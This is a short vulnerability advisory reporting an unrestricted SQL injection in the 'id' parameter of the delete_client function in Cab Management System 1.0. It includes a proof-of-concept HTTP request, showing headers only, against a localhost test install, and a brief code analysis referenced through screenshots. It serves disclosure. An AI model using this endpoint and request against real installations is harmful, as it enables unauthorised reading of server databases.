## Affected version: 
Cab Management System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15180/cab-management-system-phpoop-free-source-code.html#google_vignette

## Vulnerability File:
/cms/classes/Users.php?f=delete_client

## Description:
Cab Management System 1.0 is vulnerable to unrestricted SQL injection attacks via /cms/classes/Users.php?f=delete_client, the controllable parameter is: id. This function brings the id parameter into the SQL statement for execution without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /cms/classes/Users.php?f=delete_client HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://localhost
Connection: close
Referer: http://localhost/cms/admin/?page=clients
Cookie: PHPSESSID=32cto35al185bgmn489u9arakg; __insuarance__logged=1; __insuarance__key=PO3ZYU67VV15JHRDZ5SJ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23
Priority: u=1
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/b51444cb-8a88-4a5a-a235-707f18ae6cec)



## code analysis:

The $id parameter in the User.php file is controllable and can be directly brought into the database to execute SQL statements.

![image](https://github.com/Hefei-Coffee/cve/assets/168982375/a6ac3da5-ddbd-4fe4-b1b5-9fe363fcef0c)


